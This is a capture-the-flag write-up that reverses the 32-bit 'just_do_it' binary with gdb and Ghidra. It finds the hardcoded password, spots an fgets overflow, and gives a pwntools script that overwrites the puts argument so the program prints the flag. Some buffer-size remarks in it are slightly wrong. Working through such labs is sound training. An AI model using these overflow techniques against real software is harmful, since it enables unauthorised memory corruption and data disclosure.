# TW17 Just do it

## Reversing the binary

When the binary is run it prompts the user to enter a password: 

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/Variable$ ./just_do_it
Welcome my secret service. Do you know the password?
Input the password.
password
Invalid Password, Try Again!
```

We can check the file to see how it has been compiled and what protections are in place (we use the commands `file` and `checksec` for this):

```bash
just_do_it: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
```
```bash
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

From the output we see that it has been compiled with non-executable stack `NX` protection, but this time there is no canary or GOT (RELRO) protections. To understand about how the program works we can view the disassembly:

```bash
gef➤  disass main
Dump of assembler code for function main:
   0x080485bb <+0>:	lea    ecx,[esp+0x4]
   0x080485bf <+4>:	and    esp,0xfffffff0
   0x080485c2 <+7>:	push   DWORD PTR [ecx-0x4]
   0x080485c5 <+10>:	push   ebp
   0x080485c6 <+11>:	mov    ebp,esp
   0x080485c8 <+13>:	push   ecx
   0x080485c9 <+14>:	sub    esp,0x24
   0x080485cc <+17>:	mov    eax,ds:0x804a060
   0x080485d1 <+22>:	push   0x0
   0x080485d3 <+24>:	push   0x2
   0x080485d5 <+26>:	push   0x0
   0x080485d7 <+28>:	push   eax
   0x080485d8 <+29>:	call   0x8048490 <setvbuf@plt>
   0x080485dd <+34>:	add    esp,0x10
   0x080485e0 <+37>:	mov    eax,ds:0x804a064
   0x080485e5 <+42>:	push   0x0
   0x080485e7 <+44>:	push   0x2
   0x080485e9 <+46>:	push   0x0
   0x080485eb <+48>:	push   eax
   0x080485ec <+49>:	call   0x8048490 <setvbuf@plt>
   0x080485f1 <+54>:	add    esp,0x10
   0x080485f4 <+57>:	mov    eax,ds:0x804a040
   0x080485f9 <+62>:	push   0x0
   0x080485fb <+64>:	push   0x2
   0x080485fd <+66>:	push   0x0
   0x080485ff <+68>:	push   eax
   0x08048600 <+69>:	call   0x8048490 <setvbuf@plt>
   0x08048605 <+74>:	add    esp,0x10
   0x08048608 <+77>:	mov    eax,ds:0x804a038
   0x0804860d <+82>:	mov    DWORD PTR [ebp-0xc],eax
   0x08048610 <+85>:	sub    esp,0x8
   0x08048613 <+88>:	push   0x80487d1
   0x08048618 <+93>:	push   0x80487d3
   0x0804861d <+98>:	call   0x80484a0 <fopen@plt>
   0x08048622 <+103>:	add    esp,0x10
   0x08048625 <+106>:	mov    DWORD PTR [ebp-0x10],eax
   0x08048628 <+109>:	cmp    DWORD PTR [ebp-0x10],0x0
   0x0804862c <+113>:	jne    0x8048648 <main+141>
   0x0804862e <+115>:	sub    esp,0xc
   0x08048631 <+118>:	push   0x80487dc
   0x08048636 <+123>:	call   0x8048450 <perror@plt>
   0x0804863b <+128>:	add    esp,0x10
   0x0804863e <+131>:	sub    esp,0xc
   0x08048641 <+134>:	push   0x0
   0x08048643 <+136>:	call   0x8048470 <exit@plt>
   0x08048648 <+141>:	sub    esp,0x4
   0x0804864b <+144>:	push   DWORD PTR [ebp-0x10]
   0x0804864e <+147>:	push   0x30
   0x08048650 <+149>:	push   0x804a080
   0x08048655 <+154>:	call   0x8048440 <fgets@plt>
   0x0804865a <+159>:	add    esp,0x10
   0x0804865d <+162>:	test   eax,eax
   0x0804865f <+164>:	jne    0x804867b <main+192>
   0x08048661 <+166>:	sub    esp,0xc
   0x08048664 <+169>:	push   0x80487ee
   0x08048669 <+174>:	call   0x8048450 <perror@plt>
   0x0804866e <+179>:	add    esp,0x10
   0x08048671 <+182>:	sub    esp,0xc
   0x08048674 <+185>:	push   0x0
   0x08048676 <+187>:	call   0x8048470 <exit@plt>
   0x0804867b <+192>:	sub    esp,0xc
   0x0804867e <+195>:	push   0x8048800
   0x08048683 <+200>:	call   0x8048460 <puts@plt>
   0x08048688 <+205>:	add    esp,0x10
   0x0804868b <+208>:	sub    esp,0xc
   0x0804868e <+211>:	push   0x8048835
   0x08048693 <+216>:	call   0x8048460 <puts@plt>
   0x08048698 <+221>:	add    esp,0x10
   0x0804869b <+224>:	mov    eax,ds:0x804a060
   0x080486a0 <+229>:	sub    esp,0x4
   0x080486a3 <+232>:	push   eax
   0x080486a4 <+233>:	push   0x20
   0x080486a6 <+235>:	lea    eax,[ebp-0x20]
   0x080486a9 <+238>:	push   eax
   0x080486aa <+239>:	call   0x8048440 <fgets@plt>
   0x080486af <+244>:	add    esp,0x10
   0x080486b2 <+247>:	test   eax,eax
   0x080486b4 <+249>:	jne    0x80486d0 <main+277>
   0x080486b6 <+251>:	sub    esp,0xc
   0x080486b9 <+254>:	push   0x8048849
   0x080486be <+259>:	call   0x8048450 <perror@plt>
   0x080486c3 <+264>:	add    esp,0x10
   0x080486c6 <+267>:	sub    esp,0xc
   0x080486c9 <+270>:	push   0x0
   0x080486cb <+272>:	call   0x8048470 <exit@plt>
   0x080486d0 <+277>:	mov    eax,ds:0x804a03c
   0x080486d5 <+282>:	sub    esp,0x8
   0x080486d8 <+285>:	push   eax
   0x080486d9 <+286>:	lea    eax,[ebp-0x20]
   0x080486dc <+289>:	push   eax
   0x080486dd <+290>:	call   0x8048430 <strcmp@plt>
   0x080486e2 <+295>:	add    esp,0x10
   0x080486e5 <+298>:	test   eax,eax
   0x080486e7 <+300>:	jne    0x80486f1 <main+310>
   0x080486e9 <+302>:	mov    eax,ds:0x804a034
   0x080486ee <+307>:	mov    DWORD PTR [ebp-0xc],eax
   0x080486f1 <+310>:	sub    esp,0xc
   0x080486f4 <+313>:	push   DWORD PTR [ebp-0xc]
   0x080486f7 <+316>:	call   0x8048460 <puts@plt>
   0x080486fc <+321>:	add    esp,0x10
   0x080486ff <+324>:	mov    eax,0x0
   0x08048704 <+329>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048707 <+332>:	leave
   0x08048708 <+333>:	lea    esp,[ecx-0x4]
   0x0804870b <+336>:	ret
End of assembler dump.

```

From the disassembly output the program flow looks like:
- 3 buffers are set using `setvbuf` at main<+29>, main<+49>, and main<+69>. 
- At main<+77> `ds:0x804a038` is moved into eax and shortly after at main<+98> a call to `fopen` is made.
- If the call to fopen returns 0, then exit the program. Otherwise jump to main<+141>.
- At main<+144> there a value from ebp-0x10 is pushed to the stack, followed by main<+154> a call to `fgets`.
- At main<+162> `test eax,eax` checks if the zero flag has been set (after our input to fgets). If its zero we jump to main<+192>.
- At main<+200> and main<+216> we see some calls to `puts`, shortly followed by antother value at ebp-0x20 moved to the stack at main<+235> and another call to `fgets` at main<+239>.
- At main<+247> if the zero flag is not set the porgram exits, otherwise there is a jump to main<+277> where shortly after ebp-0x20 is string compared with a value from `ds:0x804a03c`.
- If the result from the strcmp is equal ds:0x804a034 is moved to eax, written to ebp-0xc, then puts is called after which the program calls leave and returns.

This is a high level view, but we can cross reference this by looking at the C decompiled psuedo code in Ghidra:

```c
undefined4 main(void)

{
  char *pcVar1;
  int iVar2;
  char local_28 [16];
  FILE *local_18;
  char *local_14;
  undefined1 *local_c;
  
  local_c = &stack0x00000004;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_14 = failed_message;
  local_18 = fopen("flag.txt","r");
  if (local_18 == (FILE *)0x0) {
    perror("file open error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  pcVar1 = fgets(flag,0x30,local_18);
  if (pcVar1 == (char *)0x0) {
    perror("file read error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  pcVar1 = fgets(local_28,0x20,stdin);
  if (pcVar1 == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(local_28,PASSWORD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
  return 0;
}

```

This code confirms our assumptions, but also shows the program will need to be able to read flag.txt.


We can step through the code in gdb to dig deeper on finding the password. Firstly, we want to know what the password string comparison is. We can see this section of the code refeenced in the disassembly:

```bash
   0x080486d0 <+277>:	mov    eax,ds:0x804a03c
   0x080486d5 <+282>:	sub    esp,0x8
   0x080486d8 <+285>:	push   eax
   0x080486d9 <+286>:	lea    eax,[ebp-0x20]
   0x080486dc <+289>:	push   eax
   0x080486dd <+290>:	call   0x8048430 <strcmp@plt>

```

So let's examine what is stored at 0x804a03c:

```bash
gef➤  x/s *0x804a03c
0x80487c8:	"P@SSW0RD"

```
That looks like the password. Lets try that and see if we get a different response now. We break just before the call to fgets , type in the password and step through the program:

```bash
gef➤  b *0x080486a9
Breakpoint 1 at 0x80486a9
```
We type nexti, then our password, and nexti again until just before the `strcmp`:

```bash
    0x80486d0 <main+0115>      mov    eax, ds:0x804a03c
    0x80486d5 <main+011a>      sub    esp, 0x8
    0x80486d8 <main+011d>      push   eax
 →  0x80486d9 <main+011e>      lea    eax, [ebp-0x20]
    0x80486dc <main+0121>      push   eax
    0x80486dd <main+0122>      call   0x8048430 <strcmp@plt>
    0x80486e2 <main+0127>      add    esp, 0x10
    0x80486e5 <main+012a>      test   eax, eax
    0x80486e7 <main+012c>      jne    0x80486f1 <main+310>

```

When we inspect ebp-0x20 we can see our input:

```bash
gef➤  x/s $ebp-0x20
0xffffd0d8:	"P@SSW0RD\n"

```
When we check the memory of what it is compared to at 0x804a03c we see:

```bash
gef➤  x/s *0x804a03c
0x80487c8:	"P@SSW0RD"
```
We can see this is incorrect and for obvious reason. When we enter input into fgets it is adding a newline. To fix this we'll use python to script our input and send the password terminated with a null byte `\x00`. 

```python
from pwn import *

target = process('./just_do_it')

payload = b"P@SSW0RD" + b'\x00'

target.sendline(payload)

target.interactive()


```

When we run the script we see the following output:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/Variable/JustDoIt$ python3 exploit_justdoit.py
[+] Starting local process './just_do_it': pid 8100
[*] Switching to interactive mode
[*] Process './just_do_it' stopped with exit code 0 (pid 8100)
Welcome my secret service. Do you know the password?
Input the password.
Correct Password, Welcome!
[*] Got EOF while reading in interactive

```
So it looks like we got the pasword correct, but no flag :( This clearly is not the end of the challenge. 

We need to figure out what we have missed in the analysis. After another look at the C psudeo code, we can see something strange happening with the call to `fgets`. Although the fgets is safe because it enforces a size it will read upto, the buffer passed to fgets is `local_28` and this has a fixed size of 20 bytes (0x16), whereas the size given to fgets is **0x20**:

```c
char local_28 [16]; // our buffer
// ...
pcVar1 = fgets(local_28,0x20,stdin); // fgets called with a size of 32 bytes
```

So with the difference of (32 - 20), we can overflow `local_28` by 12 bytes. This means wherever our input lands on the stack, we'll be able to write 32 bytes of data from there. We can type in our password again while debugging in gdb to see where our input lands on the stack and what addresses in memory we can overwrite.


```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd0d8  →  "P@SSWORD\n"
$ebx   : 0xf7fa1000  →  0x00225dac
$ecx   : 0xffffd0e0  →  0xffff000a  →  0x00000000
$edx   : 0xf7fa29c0  →  0x00000000
$esp   : 0xffffd0c0  →  0xffffd0d8  →  "P@SSWORD\n"
$ebp   : 0xffffd0f8  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000
$esi   : 0xffffd1c4  →  0xffffd376  →  "/home/root-at-iyn/Nightmare/BufferOverflow/Variabl[...]"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x080486af  →  <main+00f4> add esp, 0x10
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd0c0│+0x0000: 0xffffd0d8  →  "P@SSWORD\n"	 ← $esp
0xffffd0c4│+0x0004: 0x00000020 (" "?)
0xffffd0c8│+0x0008: 0xf7fa1620  →  0xfbad208b
0xffffd0cc│+0x000c: 0x00000000
0xffffd0d0│+0x0010: 0xf7fbe4a0  →  0xf7d7b000  →  0x464c457f
0xffffd0d4│+0x0014: 0xf7fd6f20  →   mov edi, eax
0xffffd0d8│+0x0018: "P@SSWORD\n"
0xffffd0dc│+0x001c: "WORD\n"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80486a6 <main+00eb>      lea    eax, [ebp-0x20]
    0x80486a9 <main+00ee>      push   eax
    0x80486aa <main+00ef>      call   0x8048440 <fgets@plt>
 →  0x80486af <main+00f4>      add    esp, 0x10
    0x80486b2 <main+00f7>      test   eax, eax
    0x80486b4 <main+00f9>      jne    0x80486d0 <main+277>
    0x80486b6 <main+00fb>      sub    esp, 0xc
    0x80486b9 <main+00fe>      push   0x8048849
    0x80486be <main+0103>      call   0x8048450 <perror@plt>
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "just_do_it", stopped 0x80486af in main (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80486af → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/64x $esp
0xffffd0c0:	0xffffd0d8	0x00000020	0xf7fa1620	0x00000000
0xffffd0d0:	0xf7fbe4a0	0xf7fd6f20	0x53534050	0x44524f57
0xffffd0e0:	0xffff000a	0xf7fbe66c	0x0804b1a0	0x080487ab
0xffffd0f0:	0x00000001	0xffffd110	0xf7ffd020	0xf7d9c519

```
So from this output we see ebp is at `0xffffd0f8` on the stack and has the value `0xf7ffd020`. After entering P@SSW0RD as an input, the stack is at `0xffffd0c0`, which points to `0xffffd0d8`, which holds the ascii characters ("P@SSWORD\n"). You can see this here: 0xffffd0d0: 0xf7fbe4a0  0xf7fd6f20 **0x53534050  0x44524f57** *// asci characters*. So if we subtract our entrypoint 0xffffd0d8 from ebp 0xffffd0f8, we can confirm that is is exactly 32 bytes, i.e 0x20 and proves our input starts at ebp-0x20:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/Variable/JustDoIt$ python3 -c "print(hex(0xffffd0f8 - 0xffffd0d8))"
0x20
```

Now we need to think about how to get the flag. At the moment we know from the C pseudo code that the binary is opening and reading the flag file. So if we can find where that is stored and print the flag we will solve the challenge. The problem we have now is where to find a variable that's passed into the call to `puts` and that we can actually overwrite. Looking back at the C pseudo code we can see that there is a call to puts that determines whether our password is correct or not:

```c
iVar2 = strcmp(local_28,PASSWORD);
if (iVar2 == 0) {
    local_14 = success_message;  
}
puts(local_14); 
return 0;

```
If the password is correct local_14 will be assigned the success_message, if its incorrect then local_14 retains it's original value `local_14 = failed_message;`. Since local_14 is passed into puts and unchanged if the password is wrong, we can control the value if we can overwrite local_14. To see which address maps to local_14, we'll revisit the disassembly and look at the value that is an argument to puts:

```bash
   0x080486e9 <+302>:	mov    eax,ds:0x804a034
   0x080486ee <+307>:	mov    DWORD PTR [ebp-0xc],eax
   0x080486f1 <+310>:	sub    esp,0xc
   0x080486f4 <+313>:	push   DWORD PTR [ebp-0xc]
   0x080486f7 <+316>:	call   0x8048460 <puts@plt>

```
The output shows ebp-0xc is passed to puts, so this will be the value we need to overwrite. To calculate where this we subtract 0xc from 0xffffd0f8 (ebp) which is `0xffffd0ec`. We can see this is exactly 20 bytes away from our input which starts at 0xffffd0d8. The final piece we need to solve is where in memory the characters for the flag is stored. Looking at the pseudo code we see `FILE *local_18;` and `local_18 = fopen("flag.txt","r");`. This shows local_18 is the variable used for the file pointer, however, this is a pointer to the associated stream which is STDIN. We need to check what variable is storing the bytes read from the file. This happens in the first call to fgets: `pcVar1 = fgets(flag,0x30,local_18);`. Looking at the disassembly of the call to fgets we see the following:

```bash
   0x08048648 <+141>:	sub    esp,0x4
   0x0804864b <+144>:	push   DWORD PTR [ebp-0x10]
   0x0804864e <+147>:	push   0x30
   0x08048650 <+149>:	push   0x804a080
   0x08048655 <+154>:	call   0x8048440 <fgets@plt>
```

The man page for fgets states:
>The fgets() function shall read bytes from stream into the array pointed to by s until n-1 bytes are read, or a <newline> is read and transferred to s, or an end-of-file condition is encountered.

It has the following function prototype:
```c
char *fgets(char *restrict s, int n, FILE *restrict stream);
```
So remembering that arguments are passed in reverse order to the stack, `0x804a080` should be the char array where the flag file is being read into. We can confirm this by breaking on main<+141> and inspecting the stack:

```bash
0xffffd0c0│+0x0000: 0x0804a080  →  <flag+0000> add BYTE PTR [eax], al	 ← $esp
0xffffd0c4│+0x0004: 0x00000030 ("0"?)
0xffffd0c8│+0x0008: 0x0804b1a0  →  0xfbad2488
0xffffd0cc│+0x000c: 0x00000000
```

This means all we need to do now when prompted for our password is send 20 bytes appended with the address 0x804a080, and this will be passed to puts and print our flag! To see this in action we can modify the python script as follows:

```python
from pwn import *

target = process("./just_do_it") 
# gdb.attach(target)
# payload = b"P@SSW0RD" + b'\x00' 
exploit = b"A"* 20 + p64(0x804a080)

target.sendline(exploit)

target.interactive()

```
When we run the script we see the flag is printed now: 

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/Variable/JustDoIt$ python3 ./exploit_justdoit.py 
[+] Starting local process './just_do_it': pid 27263
[*] Switching to interactive mode
Welcome my secret service. Do you know the password?
Input the password.
TWCTF{pwnable_warmup_I_did_it!}

[*] Got EOF while reading in interactive

```

